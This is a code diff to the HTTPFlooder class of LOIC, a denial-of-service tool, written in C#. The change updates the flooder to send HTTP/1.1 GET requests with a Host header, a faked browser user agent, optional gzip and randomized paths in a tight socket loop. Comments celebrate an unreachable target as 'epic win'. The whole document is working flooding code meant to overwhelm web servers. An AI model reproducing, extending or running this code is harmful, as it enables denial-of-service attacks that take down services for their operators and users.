@@ -1,106 +1,101 @@
 ﻿using System;
 using System.ComponentModel;
-using System.Net;
 using System.Net.Sockets;
-using System.Text;
 
 namespace LOIC
-{
-	public class HTTPFlooder
+{   
+	public class HTTPFlooder : cHLDos
 	{
-		public ReqState State = ReqState.Ready;
-
-		public int Downloaded { get; set; }
-		public int Requested { get; set; }
-		public int Failed { get; set; }
-
-		public bool IsFlooding { get; set; }
 		public string IP { get; set; }
+        public string DNS { get; set; }
 		public int Port { get; set; }
 		public string Subsite { get; set; }
-		public int Delay { get; set; }
-		public int Timeout { get; set; }
 		public bool Resp { get; set; }
-        private System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer();
 
-		private long LastAction;
-		private Random rnd = new Random();
+        private Random rnd = new Random();
         private bool random;
-		public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
+        private bool usegZip;
 
-		public HTTPFlooder(string ip, int port, string subSite, bool resp, int delay, int timeout, bool random)
+        public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip)
 		{
+            this.IsDelayed = false;
+            this.DNS = (dns == "") ? ip : dns;
 			this.IP = ip;
 			this.Port = port;
 			this.Subsite = subSite;
 			this.Resp = resp;
 			this.Delay = delay;
-			this.Timeout = timeout;
+			this.Timeout = timeout * 1000;
             this.random = random;
+            this.usegZip = usegzip;
 		}
-		public void Start()
+		public override void start()
 		{
-			IsFlooding = true; LastAction = Tick();
-
-			tTimepoll = new System.Windows.Forms.Timer();
-			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
-			tTimepoll.Start();
-
+            IsDelayed = false;
+			IsFlooding = true; 
 			var bw = new BackgroundWorker();
 			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
 			bw.RunWorkerAsync();
 		}
-		void tTimepoll_Tick(object sender, EventArgs e)
-		{
-			if (Tick() > LastAction + Timeout)
-			{
-				Failed++; State = ReqState.Failed;
-                tTimepoll.Stop();
-                if (IsFlooding)
-                {
-                    tTimepoll.Start();
-                }
-			}
-		}
+
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
 			{
+                int bfsize = 1024; // this should be less than the MTU
                 byte[] buf;
                 if (random == true)
                 {
-                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.0{2}{2}{2}", Subsite, new Functions().RandomString(), Environment.NewLine));
+                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}{4}{2}", Subsite, new Functions().RandomString(), Environment.NewLine, DNS, ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine): "")));
                 }
                 else
                 {
-                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.0{1}{1}{1}", Subsite, Environment.NewLine));
+                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}Host: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}{3}{1}", Subsite, Environment.NewLine, DNS, ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine): "")));
                 }
-				var host = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
-				while (IsFlooding)
+
+                byte[] recvBuf = new byte[bfsize];
+                int recvd = 0;
+                while (IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
-					LastAction = Tick();
-					byte[] recvBuf = new byte[64];
-					var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-					State = ReqState.Connecting; // SET STATE TO CONNECTING //
-					socket.Connect(host);
-					socket.Blocking = Resp;
-					State = ReqState.Requesting; // SET STATE TO REQUESTING //
-					socket.Send(buf, SocketFlags.None);
-					State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
-					if (Resp) socket.Receive(recvBuf, 64, SocketFlags.None);
-					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
-					tTimepoll.Stop();
-					tTimepoll.Start();
-					if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
+                    try
+                    {
+                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        State = ReqState.Connecting; // SET STATE TO CONNECTING //
+                        socket.Connect(((IP == "") ? DNS : IP), Port); //(host)
+                        socket.Blocking = Resp;
+                        State = ReqState.Requesting; // SET STATE TO REQUESTING //
+                        socket.ReceiveTimeout = Timeout;
+                        socket.Send(buf, SocketFlags.None);
+                        State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
+                        if (Resp)
+                        {
+                            try
+                            {
+                                recvd = 0;
+                                do
+                                {
+                                    recvd = socket.Receive(recvBuf);
+                                } while ((recvd > bfsize) && socket.Connected);
+                                Downloaded++;
+                            }
+                            catch
+                            { // timeout reached - epic win?
+                                Failed++;
+                            }
+                        }
+                        socket.Close(); // let's close the socket - there are other methods for socket-starving!
+                        State = ReqState.Completed;  // SET STATE TO COMPLETED
+                    }
+                    catch
+                    { // host unreachable == epic win!
+                        Failed++;
+                    }
+					if (Delay > 0) System.Threading.Thread.Sleep(Delay);
 				}
 			}
 			catch { }
 			finally { IsFlooding = false; }
-		}
-		private static long Tick()
-		{
-			return DateTime.Now.Ticks / 10000;
 		}
 	}
 }
